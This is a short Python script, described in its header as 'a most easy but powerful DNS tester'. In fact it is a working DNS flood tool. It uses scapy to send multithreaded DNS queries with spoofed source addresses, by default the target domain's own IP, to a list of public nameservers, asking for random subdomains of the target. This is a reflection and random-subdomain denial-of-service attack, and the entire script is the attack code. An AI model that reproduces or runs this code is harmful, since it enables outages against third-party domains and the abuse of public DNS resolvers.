#!/usr/bin/env python
#coding:utf-8
# Author:  Beining --<>
# Purpose: A most easy but powerful DNS tester
# Created: 01/15/2015

import os
import sys
import unittest
import socket
import random
from multiprocessing.dummy import Pool as ThreadPool
from scapy import *
from scapy.all import *
import csv

global DNS_IP_LIST
DNS_IP_LIST = []
global FAKE_IP
FAKE_IP = ''

#----------------------------------------------------------------------
def dns_amp(qname_address):
    """"""
    dns_ip = random.choice(DNS_IP_LIST)
    a = IP(dst=dns_ip,src=FAKE_IP) 
    b = UDP(dport=53)
    c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)
    c.qd=DNSQR(qname=qname_address,qtype=1,qclass=1)
    p = a/b/c
    try:
        send(p)
    except Exception as e:
        print('WARNING: DNSTest failed: %s' % e)
        traceback.print_exc()

#----------------------------------------------------------------------
def main(address, time, length, thread_num, fake_ip):
    """"""
    domain_list = [''.join(map(lambda xx:(hex(ord(xx))[2:]),os.urandom(int(length)))) + '.' + str(address) for i in range(int(time))]
    pool = ThreadPool(int(thread_num))
    results = pool.map(dns_amp, domain_list)
    #close the pool and wait for the work to finish 
    pool.close() 
    pool.join()

#----------------------------------------------------------------------
def read_dns_ip(filename = './nameservers.csv'):
    """"""
    dns_ip_list = []
    with open(filename, 'rb') as f:
        reader = csv.reader(f)
        for row in reader:
            if reader.line_num == 1:  
                    continue
            dns_ip_list.append(row[0])
    return dns_ip_list

#----------------------------------------------------------------------
if __name__=='__main__':
    address = str(sys.argv[1])
    time = int(sys.argv[2])
    thread_num = int(sys.argv[3])
    try:
        FAKE_IP = str((sys.argv[4]))
    except:
        FAKE_IP = socket.getaddrinfo("www." + address, 80, 0, 0, socket.SOL_TCP)[0][4][0]
    try:
        dns_filename = str((sys.argv[5]))
    except:
        dns_filename = './nameservers.csv'
    try:
        length = int(sys.argv[6])
    except:
        length = random.randint(6, 32)
    print('Reading DNS IP list...')
    DNS_IP_LIST = read_dns_ip(dns_filename)
    print('Start!')
    main(address, time, length, thread_num, FAKE_IP)
    print('Done!')